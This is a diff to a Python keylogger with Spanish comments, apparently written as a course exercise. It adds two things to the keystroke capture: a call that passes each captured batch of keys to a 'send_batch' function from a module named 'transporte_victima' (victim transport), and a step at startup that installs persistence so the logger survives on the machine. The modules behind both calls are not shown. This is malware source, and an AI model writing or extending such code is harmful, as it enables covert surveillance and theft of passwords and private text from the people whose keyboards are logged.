@@ -16,6 +16,9 @@ import pynput
 from datetime import datetime, timezone
 from pynput.keyboard import Key, Listener
 
+from persistencia import instalar_persistencia, verificar_persistencia
+from transporte_victima import send_batch
+
 # ══════════════════════════════════════════════════════════════════════════════
 # CONFIGURACIÓN GLOBAL
 # ════════════════════════════════════════════════════════════════════════════════
@@ -140,6 +143,7 @@ def on_flush(batch: list) -> None:
     print(f"[FLUSH] {len(batch)} teclas capturadas")
     for ts, key in batch:
         print(f"  {ts}  {key}")
+    send_batch(batch)
 
     # ── Siguiente etapa (Ejercicio 2) ──────────────────────────────────────
     # import json
@@ -239,6 +243,16 @@ def main() -> None:
         3. Al detectar ESC o KeyboardInterrupt, detiene el buffer
            (flush final) y cierra limpiamente.
     """
+    
+    # ── Persistencia ───────────────────────────────────────────────────────
+    # Instalar solo si no existe aún — evita duplicar la entrada
+    if not verificar_persistencia():
+        instalar_persistencia()
+    else:
+        print("[*] Persistencia ya instalada.")
+    
+
+    # ── Keylogger ───────────────────────────────────────────────────────
     global _buffer
     _buffer = KeyBuffer(
         max_size=BUFFER_MAX,
